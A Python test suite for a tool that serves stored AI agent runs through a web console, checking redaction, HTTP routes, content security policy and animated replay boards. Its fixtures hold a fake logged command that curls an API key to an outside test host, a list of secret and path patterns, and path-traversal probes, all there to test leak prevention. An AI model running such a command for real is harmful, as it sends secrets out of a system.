"""Swarm solo: the stored-run reader, its redaction, its routes, and the boards run in node.

Fixtures are made here, never copied from a real run: run output is not committed.
"""
import json
import shutil
import subprocess
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

from swarm import solo

FRONT = Path(__file__).resolve().parents[1] / "front-solo"
NODE = shutil.which("node")
LEAKS = ["/home/", "/tmp/", "/etc/", "exedev", "@example", "sk-ant", "ghp_", "deadbeefdeadbeefdeadbeefdeadbeef", "http://", "https://"]


def _req(at, op, arg, status=200, **kw):
    return {"api": "responses", "at": at, "op": op, "arg": arg, "status": status, "completed": True, "error": None,
            "request_bytes": 30000 + int(at * 10), "path": "/s/deadbeefdeadbeefdeadbeefdeadbeef/v1/responses",
            "model": "swarm-scripted-1", "tools_offered": ["Read", "Bash"], **kw}


def make_run(root: Path, rid: str, harness="ante", complete=True, size=2, fail_second=False):
    d = root / "runs" / rid
    (d / "bundle" / "logs").mkdir(parents=True)
    (d / "run.json").write_text(json.dumps({
        "id": rid, "harness": harness, "complete": complete, "preset": "mixed", "size": size, "title": "All of it at once",
        "created": "2026-11-06T15:55:07Z", "harness_version": "ante 0.3.0", "plan_sha256": "d69cfaeabb95" + "0" * 52,
        "chain_head": "174295c44a05", "verify": "verified", "result": {"wall_s_median": 0.5, "max_running": size},
        "host": "/home/exedev/swarm-live-data", "owner": "someone@example.com"}))
    attempts = []
    for i in range(size):
        name = f"c000-{harness}-n{size}-s{i:03d}"
        passed = not (fail_second and i == 1)
        attempts.append({"attempt": name, "slot": i, "task": "csv-totals", "passed": passed,
                         "failure": None if passed else {"kind": "check_failed"},
                         "agent": {"wall_s": 0.47, "cpu_s": 0.12, "max_process_rss_kb": 30268},
                         "isolation": "process: /tmp/swarm-abc/work"})
        t = 1793980508.0 + i * 0.2
        rows = [_req(t, "read", "report.py"), _req(t + 0.04, "write", "/home/exedev/secret/report.py"),
                _req(t + 0.1, "bash", "cd /tmp/swarm-22ayvrh6/c000/work && python3 report.py && curl https://x.test/?k=sk-ant-oat01-abcdefghijkl",
                     status=200 if passed else 500),
                _req(t + 0.5, "final", "Done; mail someone@example.com about deadbeefdeadbeefdeadbeefdeadbeef.")]
        (d / "bundle" / "logs" / name).mkdir()
        (d / "bundle" / "logs" / name / "requests.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows))
    (d / "bundle" / "attempts.jsonl").write_text("".join(json.dumps(a) + "\n" for a in attempts))
    return d


class TestReader(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="solo-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        make_run(self.tmp, "aaaaaaaaaaaa")
        make_run(self.tmp, "bbbbbbbbbbbb", harness="codex")
        make_run(self.tmp, "cccccccccccc", complete=False)
        make_run(self.tmp, "dddddddddddd", size=3, fail_second=True)
        self.lib = solo.Library(self.tmp)

    def test_only_complete_ante_runs(self):
        self.assertEqual(sorted(r["id"] for r in self.lib.listing()), ["aaaaaaaaaaaa", "dddddddddddd"])
        self.assertIsNone(self.lib.get("bbbbbbbbbbbb"))
        self.assertIsNone(self.lib.get("../../etc"))

    def test_events_follow_the_trace_and_end_with_the_check(self):
        run = self.lib.get("dddddddddddd")
        self.assertEqual((run["attempts_n"], run["passes"]), (3, 2))
        a, b = run["attempts"][0], run["attempts"][1]
        self.assertEqual([e["kind"] for e in a["events"]], ["read", "edit", "test", "done", "verify"])
        self.assertEqual(a["steps"], 4)
        self.assertEqual(a["events"][0]["t"], 0.0)
        self.assertTrue(a["events"][-1]["ok"])
        self.assertFalse(b["events"][-1]["ok"])
        self.assertFalse(b["events"][2]["ok"])  # the failed request shows as a failed step
        self.assertEqual(b["failure"], "check_failed")
        self.assertEqual(a["start"], 0.0)  # times are relative to the run's first request
        self.assertAlmostEqual(b["start"], 0.2, places=3)

    def test_nothing_private_leaves(self):
        blob = json.dumps(self.lib.listing()) + json.dumps(self.lib.get("dddddddddddd"))
        for leak in LEAKS:
            self.assertNotIn(leak, blob, leak)
        edit = self.lib.get("aaaaaaaaaaaa")["attempts"][0]["events"][1]
        self.assertNotIn("arg", edit)  # an absolute file path is hidden, not shortened
        for key in ("isolation", "host", "owner", "path", "tools_offered", "model"):
            self.assertNotIn(f'"{key}"', blob)

    def test_clean(self):
        self.assertEqual(solo.clean("cat /home/exedev/x/y.json"), "cat <path>")
        self.assertEqual(solo.clean("ab " * 50, 10), "ab ab ab…")
        self.assertIsNone(solo.clean(None))
        self.assertIsNone(solo.clean_file("../etc/passwd"))
        self.assertIsNone(solo.clean_file("/abs/file.py"))
        self.assertEqual(solo.clean_file("services/api.json"), "services/api.json")

    def test_reload_when_a_run_arrives(self):
        self.assertEqual(len(self.lib.listing()), 2)
        make_run(self.tmp, "eeeeeeeeeeee")
        self.assertEqual(len(self.lib.listing()), 3)


class TestRoutes(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="solo-routes-"))
        make_run(cls.tmp, "aaaaaaaaaaaa")
        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), solo.handler_for(solo.Library(cls.tmp), FRONT, FRONT.parent / "front-maze"))
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.server.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()
        shutil.rmtree(cls.tmp, True)

    def get(self, path):
        try:
            with urllib.request.urlopen(self.base + path) as r:
                return r.status, r.headers, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.headers, e.read()

    def test_routes(self):
        status, headers, body = self.get("/api/runs")
        self.assertEqual(status, 200)
        self.assertEqual([r["id"] for r in json.loads(body)["runs"]], ["aaaaaaaaaaaa"])
        self.assertIn("default-src 'self'", headers["Content-Security-Policy"])
        self.assertEqual(self.get("/api/runs/aaaaaaaaaaaa")[0], 200)
        self.assertEqual(self.get("/api/runs/ffffffffffff")[0], 404)
        self.assertEqual(self.get("/api/nope")[0], 404)
        for page in ("/", "/r/aaaaaaaaaaaa"):
            status, headers, body = self.get(page)
            self.assertEqual(status, 200)
            self.assertIn(b"AX-1", body)
        self.assertEqual(self.get("/fonts/spec-mono-400-core.woff2")[1]["Content-Type"], "font/woff2")
        self.assertEqual(self.get("/r/not-a-run")[0], 404)
        self.assertEqual(self.get("/%2e%2e/src/swarm/solo.py")[0], 404)


@unittest.skipUnless(NODE, "node not installed")
class TestBoards(unittest.TestCase):
    HARNESS = """
const B = require(process.argv[process.argv.length - 1] + '/boards.js');
const { events, attempts } = JSON.parse(require('fs').readFileSync(0, 'utf8'));
const out = {};
for (const board of ['trail', 'hill']) {
  const frames = [];
  for (let at = 0; at <= events.length; at += 0.25) frames.push(B.frame(board, events, at));
  out[board] = { frames, again: B.frame(board, events, events.length) };
}
out.grid = [0, 0.3, 99].map((t) => B.grid.frame(attempts, t).tally);
out.cols = [1, 4, 32, 256, 1000].map(B.grid.cols);
console.log(JSON.stringify(out));
"""

    def run_boards(self, events, attempts=()):
        r = subprocess.run([NODE, "-e", self.HARNESS, str(FRONT)], input=json.dumps({"events": events, "attempts": list(attempts)}),
                           capture_output=True, text=True, timeout=30)
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)

    def events(self, fail=False):
        tmp = Path(tempfile.mkdtemp(prefix="solo-boards-"))
        self.addCleanup(shutil.rmtree, tmp, True)
        make_run(tmp, "aaaaaaaaaaaa", size=2, fail_second=fail)
        return solo.Library(tmp).get("aaaaaaaaaaaa")["attempts"]

    def test_each_board_plays_to_the_end_and_counts_match_the_receipt(self):
        attempts = self.events()
        evs = attempts[0]["events"]
        out = self.run_boards(evs, attempts)
        for board in ("trail", "hill"):
            frames = out[board]["frames"]
            self.assertEqual(frames[0]["count"], 0)
            self.assertEqual(frames[-1]["count"], len(evs))
            self.assertEqual(frames[-1]["steps"], attempts[0]["steps"])
            self.assertTrue(frames[-1]["verified"])
            self.assertTrue(all(f["verified"] is None for f in frames[:-1]))
            counts = [f["count"] for f in frames]
            self.assertEqual(counts, sorted(counts))
            self.assertEqual(frames[-1], out[board]["again"])  # deterministic
        trail = out["trail"]["frames"][-1]
        self.assertEqual(trail["len"], 3 + attempts[0]["steps"])
        self.assertEqual([f["state"] for f in trail["food"]], ["nibbled"])  # read; the edit named a hidden absolute path
        self.assertEqual(out["grid"][0], {"wait": 1, "run": 1, "pass": 0, "fail": 0})
        self.assertEqual(out["grid"][2], {"wait": 0, "run": 0, "pass": 2, "fail": 0})
        self.assertEqual(out["cols"], [1, 2, 6, 16, 16])

    def test_a_failed_step_knocks_the_trail_back_and_the_check_fails(self):
        attempts = self.events(fail=True)
        out = self.run_boards(attempts[1]["events"], attempts)
        trail = out["trail"]["frames"][-1]
        self.assertEqual(trail["knocks"], 2)  # the failed command, then the failed check
        self.assertFalse(trail["verified"])
        self.assertFalse(out["hill"]["frames"][-1]["verified"])
        self.assertEqual(out["grid"][2], {"wait": 0, "run": 0, "pass": 1, "fail": 1})

    def test_hill_clears_full_rows(self):
        evs = [{"t": i, "kind": "done", "ok": True} for i in range(12)] + [{"t": 12, "kind": "verify", "ok": True}]
        last = self.run_boards(evs)["hill"]["frames"][-1]
        filled = {}
        for c in last["cells"]:
            filled[c["y"]] = filled.get(c["y"], 0) + 1
        self.assertTrue(all(n < 10 for n in filled.values()))  # no full row is left standing
        self.assertEqual(len(last["cells"]) + 10 * last["cleared"], 12 * 5)



class TestMazeRoutes(TestRoutes):
    def test_maze_pages_get_a_skeleton_and_a_csp_naming_their_own_inline_blocks(self):
        import base64, hashlib, re
        for path in ("/maze/", "/maze/race", "/maze/prototype"):
            status, headers, body = self.get(path)
            self.assertEqual(status, 200, path)
            html = body.decode()
            self.assertTrue(html.startswith("<!doctype html>"), path)
            csp = headers["Content-Security-Policy"]
            self.assertNotIn("unsafe-inline", csp)
            self.assertNotIn("https:", csp, path)  # no Google Fonts or any other outside host, on any maze page
            for block in re.findall(r"<(?:script|style)>(.*?)</(?:script|style)>", html, re.S):
                digest = base64.b64encode(hashlib.sha256(block.encode()).digest()).decode()
                self.assertIn(f"'sha256-{digest}'", csp, path)

    def test_the_race_is_the_ax1_maze_cartridge_under_the_console_csp(self):
        _, solo_headers, _ = self.get("/")
        for path in ("/maze/", "/maze/race"):
            status, headers, body = self.get(path)
            self.assertEqual(status, 200, path)
            html = body.decode()
            self.assertIn("AX-1", html)
            self.assertEqual(headers["Content-Security-Policy"], solo_headers["Content-Security-Policy"], path)
            for src in ("/maze/maze-core.js", "/mazeplay.js", "/maze.js", "/solo.css", "/maze.css"):
                self.assertIn(f'"{src}"', html, path)
        for path, ctype in (("/maze.js", "text/javascript"), ("/mazeplay.js", "text/javascript"), ("/maze.css", "text/css")):
            status, headers, _ = self.get(path)
            self.assertEqual(status, 200, path)
            self.assertTrue(headers["Content-Type"].startswith(ctype), path)
        # The analysis view stays reachable, and both ways back are linked from the cartridge.
        html = self.get("/maze/")[2].decode()
        self.assertIn('href="/maze/prototype"', html)
        self.assertIn('href="/"', html)
        self.assertIn('href="/maze/"', self.get("/")[2].decode())
        self.assertIn('href="/maze/"', self.get("/maze/prototype")[2].decode())

    def test_console_pages_have_nothing_inline_and_nothing_from_outside(self):
        import re
        for page in sorted(FRONT.glob("*.html")):
            html = page.read_text()
            self.assertIsNone(re.search(r"<style\b", html), page.name)
            self.assertIsNone(re.search(r"\sstyle\s*=", html), page.name)
            self.assertIsNone(re.search(r"\son[a-z]+\s*=", html), page.name)
            for tag in re.findall(r"<script\b[^>]*>(.*?)</script>", html, re.S):
                self.assertEqual(tag.strip(), "", page.name)
            for url in re.findall(r'<(?:script|link)\b[^>]*(?:src|href)="([^"]+)"', html):
                self.assertTrue(url.startswith("/") and not url.startswith("//"), (page.name, url))

    def test_maze_core_is_served_and_nothing_outside_front_maze(self):
        status, headers, body = self.get("/maze/maze-core.js")
        self.assertEqual(status, 200)
        self.assertIn(b"MazeCore", body)
        for path in ("/maze/../src/swarm/solo.py", "/maze/%2e%2e/solo.js", "/maze/nope", "/maze/a/b.js",
                     "/maze/race/", "/maze/prototype/", "/maze/maze-core.js/", "/maze//"):
            self.assertEqual(self.get(path)[0], 404, path)

    def test_bare_maze_redirects_to_the_slash(self):
        req = urllib.request.Request(self.base + "/maze")
        opener = urllib.request.build_opener(type("NoRedirect", (urllib.request.HTTPRedirectHandler,), {"redirect_request": lambda *a: None}))
        try:
            opener.open(req)
            self.fail("expected a redirect")
        except urllib.error.HTTPError as e:
            self.assertEqual((e.code, e.headers["Location"]), (308, "/maze/"))



@unittest.skipUnless(NODE, "node not installed")
class TestMazeCartridge(unittest.TestCase):
    """The cartridge replays each simulated opponent from simulateFleet's log; the replay must land exactly where the
    simulation did, for every opponent on the menu."""
    HARNESS = """
const dir = process.argv[process.argv.length - 1];
const Core = require(dir + '/../front-maze/maze-core.js'), P = require(dir + '/mazeplay.js');
const out = [];
for (const size of Object.keys(P.SIZES)) for (const seed of [1, 2026, 4294967295]) for (const o of P.OPPONENTS) {
  const prm = P.params(size, seed), maze = Core.generate(prm), plan = P.plan(Core, prm, o.id), rep = new P.Replay(maze, plan);
  let calls = [];
  for (let t = 1; t <= plan.endTick; t++) { rep.advance(t); calls.push(rep.calls); }
  const win = plan.out.exit_agent === null ? null : rep.agents[plan.out.exit_agent];
  out.push({ size, seed, id: o.id, mode: o.mode, count: o.count, found: plan.found, endTick: plan.endTick, exitTick: plan.out.exit_tick,
    calls: rep.calls, simCalls: plan.out.calls, mapped: rep.mapped() - 1, simUnique: plan.out.unique_cells,
    winnerAtExit: win ? win.pos === maze.exit : null, route: rep.route === plan.out.route, monotone: calls.every((c, i) => !i || c >= calls[i - 1]),
    solo: o.mode === 'single' ? Core.simulate(prm, 1).exit_tick : null, swarm: o.mode === 'swarm' ? Core.simulate(prm, o.count).exit_tick : null });
}
out.push({ keys: [P.bestKey('m', 'solo', 6), P.bestKey('s', 'swarm16', 12), P.bestKey('l', 'council3', 3), P.bestKey('m', 'nope', 6)] });
console.log(JSON.stringify(out));
"""

    def test_replay_matches_the_simulation_for_every_opponent(self):
        r = subprocess.run([NODE, "-e", self.HARNESS, str(FRONT)], capture_output=True, text=True, timeout=120)
        self.assertEqual(r.returncode, 0, r.stderr)
        rows = json.loads(r.stdout)
        keys = rows.pop()["keys"]
        self.assertEqual(len(rows), 3 * 3 * 6)
        for row in rows:
            with self.subTest(**{k: row[k] for k in ("size", "seed", "id")}):
                self.assertTrue(row["found"])
                self.assertEqual(row["endTick"], row["exitTick"])
                self.assertEqual(row["calls"], row["simCalls"])
                self.assertEqual(row["mapped"], row["simUnique"])
                self.assertTrue(row["monotone"])
                if row["mode"] == "council":
                    self.assertTrue(row["route"])
                else:
                    self.assertTrue(row["winnerAtExit"])
                if row["mode"] == "single":
                    self.assertEqual(row["endTick"], row["solo"])  # the same race the first race page ran
                if row["mode"] == "swarm":
                    self.assertEqual(row["endTick"], row["swarm"])
        # Bests set on the first race page (opponents 1, 4, 16) keep their keys.
        self.assertEqual(keys, ["maze-race:m:1:6", "maze-race:s:16:12", "maze-race:l:council3:3", "maze-race:m:1:6"])


if __name__ == "__main__":
    unittest.main()
